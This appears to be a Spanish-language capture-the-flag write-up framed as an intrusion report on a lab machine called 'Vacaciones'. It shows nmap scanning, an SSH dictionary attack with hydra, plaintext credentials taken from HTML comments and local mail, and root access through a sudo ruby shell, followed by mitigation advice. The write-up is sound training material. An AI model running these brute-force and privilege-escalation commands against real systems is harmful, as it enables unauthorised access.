
vacaciones
📑 Reporte de Intrusión: Máquina Vacaciones
📌 Información General
Dirección IP: 172.17.0.2
Severidad: 🔴 CRÍTICA
Fecha: 10 de abril de 2026
Autor: Juan
🎯 1. Resumen Ejecutivo
Se ha realizado una auditoria de seguridad sobre el sistema objetivo, logrando un compromiso total (acceso root).

La intrusión fue posible mediante una cadena de vulnerabilidades críticas:

Exposición de información sensible en comentarios HTML
Uso de contraseñas débiles
Almacenamiento de credenciales en texto plano
Configuración insegura de privilegios sudo
Estas debilidades permitieron a un atacante avanzar desde acceso inicial hasta control completo del sistema.

🔍 2. Fase de Reconocimiento y Enumeración
2.1 Escaneo de Puertos
Se realizó un escaneo completo de puertos:

nmap -p- --open -sS -sC -sV -T4 -n -vvv -O -Pn 172.17.0.2
📊 Resultados relevantes
Puerto	Estado	Servicio	Versión
22/tcp	🔓 Abierto	SSH	OpenSSH 7.6p1 Ubuntu
80/tcp	🔓 Abierto	HTTP	Apache 2.4.29
2.2 Inspección Web (Puerto 80)
Al analizar el código fuente del sitio web, se identificó una fuga de información en comentarios HTML:

Fuga de Información
<!-- De: Juan Para: Camilo, te he dejado un correo, es importante... -->
💡 Este comentario sugiere la existencia de usuarios válidos en el sistema.

⚡ 3. Fase de Explotación
3.1 Fuerza Bruta SSH (Acceso Inicial)
Se utilizó un ataque de diccionario contra el servicio SSH:

hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
Success
Credenciales obtenidas:
camilo : password1

3.2 Acceso al Sistema
ssh camilo@172.17.0.2
whoami
# camilo
3.3 Movimiento Lateral
Se revisó el correo local del usuario:

cat /var/mail/camilo/correo.txt
Info
Contenido relevante:

Hola Camilo...
aquí tienes la contraseña: 2k84dicb
Success
Nueva credencial descubierta: juan : 2k84dicb

Se accede al sistema con el nuevo usuario:

ssh juan@172.17.0.2
🚀 4. Escalada de Privilegios
4.1 Enumeración de privilegios
sudo -l
Warning
Configuración insegura detectada:

(ALL) NOPASSWD: /usr/bin/ruby
4.2 Explotación (GTFOBins)
Se utiliza Ruby para ejecutar una shell privilegiada:

sudo ruby -e 'exec "/bin/bash"'
Verificación:

whoami
# root
Success
Acceso root obtenido con éxito

🧠 5. Cadena de Ataque
Enumeración → descubrimiento de servicios
Fuga de información → identificación de usuarios
Fuerza bruta → acceso como camilo
Exposición de credenciales → lectura de correo
Movimiento lateral → acceso como juan
Mala configuración de sudo → ejecución de Ruby
Escalada → acceso root
🛑 6. Vulnerabilidades Identificadas
Contraseñas débiles (ej: password1)
Credenciales en texto plano
Reutilización de contraseñas
Exposición de información en HTML
Configuración insegura de sudo
🛡️ 7. Recomendaciones de Mitigación
🔐 Hardening de SSH
Deshabilitar autenticación por contraseña
Implementar autenticación mediante claves SSH
🔑 Gestión de credenciales
Evitar almacenamiento en texto plano
Rotación periódica de contraseñas
⚙️ Control de privilegios
Aplicar principio de mínimo privilegio
Restringir ejecución de binarios peligrosos en /etc/sudoers
🧹 Seguridad en desarrollo
Eliminar comentarios sensibles en producción
Revisar código antes de despliegue
📊 Monitorización
Implementar herramientas como fail2ban
Auditoría continua de logs
🖼️ 8. Evidencias
📸 Evidencia 1: Reconocimiento
No se encontró “nmap_vacaciones 1.png”.

Escaneo de puertos y análisis del servicio web

📸 Evidencia 2: Acceso Inicial
No se encontró “hydra_vacaciones.png”.

Ataque exitoso de fuerza bruta contra SSH

📸 Evidencia 3: Escalada de Privilegios
No se encontró “root_vacaciones.png”.

Obtención de shell como root mediante Ruby

🏁 9. Conclusión
El sistema presenta múltiples fallos críticos encadenados que permiten su compromiso total.

🔴 Nivel de riesgo: CRÍTICO

Este laboratorio demuestra cómo errores básicos de configuración pueden derivar en una intrusión completa.

